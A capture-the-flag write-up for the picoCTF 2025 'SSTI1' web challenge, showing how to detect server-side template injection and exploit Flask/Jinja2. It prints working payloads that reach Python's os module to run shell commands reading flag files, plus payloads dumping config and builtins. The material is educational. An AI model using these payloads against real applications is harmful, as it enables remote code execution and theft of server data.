# 🕸️ picoCTF 2025 – Web Exploitation – SSTI1

## 🔎 Challenge Description

We are given a web application that takes user input and reflects it back into a web page. Our task is to determine whether the application is vulnerable to **Server-Side Template Injection (SSTI)** and exploit it to retrieve the flag.

---

## 🛠️ Step 1 – Initial Reconnaissance

1. Open the provided challenge URL in a browser.

2. Observe the input field or query parameter that reflects back user input.

3. Enter a simple string such as:

   
   hello
   

   and confirm that it is reflected in the page.

4. Next, test if template expressions are being rendered. For example:

   
   {{7*7}}
   

   * If the output is 49 instead of {{7*7}}, then the application is **processing template expressions** → possible SSTI.

---

## 🛠️ Step 2 – Identifying the Template Engine

Different template engines have slightly different syntax. Common detection payloads:

* Jinja2 (Python Flask/Django): {{7*7}}
* Twig (PHP): {{7*7}}
* Smarty (PHP): {$smarty.version}
* ERB (Ruby): <%= 7*7 %>

For picoCTF, challenges usually use **Flask/Jinja2** → so payloads like {{7*7}} will work.

---

## 🛠️ Step 3 – Exploitation

Once confirmed, we attempt to **read sensitive data** through SSTI.

### 🔹 Useful Payloads:

1. **Arithmetic test (confirm SSTI):**

   
   {{7*7}}
   

   → Output: 49

2. **Access configuration/environment variables:**

   
   {{config}}
   

   or

   
   {{request.application.__globals__.__builtins__}}
   

3. **Read the flag (common in CTFs):**

   
   {{self.__init__.__globals__['os'].popen('cat flag.txt').read()}}
   

   or

   
   {{cycler.__init__.__globals__.os.popen("cat /flag.txt").read()}}
   

   ⚠️ The exact payload depends on how the backend is sandboxed. Most picoCTF SSTI challenges allow a direct payload to read /flag.txt.

---

## 🛠️ Step 4 – Extracting the Flag

* Once a working payload is injected, the flag will be displayed on the page.
* Copy it and submit to picoCTF. ✅

---

## 📌 Key Learning Points

* SSTI occurs when **user input is unsafely evaluated** in a template engine.
* Testing with arithmetic expressions like {{7*7}} quickly confirms SSTI.
* Exploitation often involves breaking out into Python’s os or similar libraries to read files.
* In CTFs, the target file is usually flag.txt or /flag.txt.

---

## 🏁 Final Answer Format


picoCTF{<captured_flag>}
